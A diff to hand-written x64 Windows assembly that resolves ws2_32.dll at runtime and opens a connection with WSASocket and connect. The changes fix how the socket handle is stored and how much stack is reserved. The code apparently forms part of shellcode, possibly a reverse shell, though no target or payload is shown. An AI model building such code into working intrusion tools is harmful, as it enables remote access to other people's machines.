@@ -7,7 +7,7 @@
 ;note: ExitProcess is forwarded
 main proc
 
-    sub rsp, 28h            ;reserve stack space for called functions
+    sub rsp, 30h                    ;reserve stack space for called functions + socket handle
     and rsp, 0fffffffffffffff0h     ;make sure stack 16-byte aligned 
     
     lea rdx, loadlib_func
@@ -22,6 +22,8 @@ main proc
     call socket             ; setup socket
     cmp rax, -1h            ; check result 
     je  cleanup             ; failed INVALID_SOCKET
+    
+    mov [rsp+28h], rax      ; save socket handle
     
     call connect            ; connect socket
     cmp rax, 0h             ; check result
@@ -121,6 +123,7 @@ socket proc
     mov rcx, 2h             ; af
     
     call rax                ; WSASocket
+                            ; socket will be in rax
         
     add rsp, 30h           ; deallocate stack space
     
@@ -135,10 +138,10 @@ connect proc
     mov rbp, rsp
     
     ; allocate space
-    sub rsp, 3ah                   ; allocate space (20h shadow + sockaddr 10h + socketfd 4h + 6h padding)
+    sub rsp, 40h                   ; allocate space (20h shadow + sockaddr 10h + socketfd 8h + 6h padding)
     and rsp, 0fffffffffffffff0h    ; make sure stack 16-byte aligned
     
-    mov [rbp-12h], eax              ; save socket fd
+    mov [rbp-12h], rax              ; socket handle
     
     lea rcx, ws2_32_dll
     call r15                ;load ws2_32.dll
@@ -159,11 +162,11 @@ connect proc
     
     mov r8, 10h             ; namelen 16 bytes
     lea rdx, [rbp-0ch]      ; sockaddr
-    mov ecx, [rbp-12h]      ; socket fd
+    mov rcx, [rbp-12h]      ; socket handle
     
     call rax                ; connect
     
-    add rsp, 3ah           ; deallocate stack space
+    add rsp, 40h           ; deallocate stack space
     
     leave
     ret
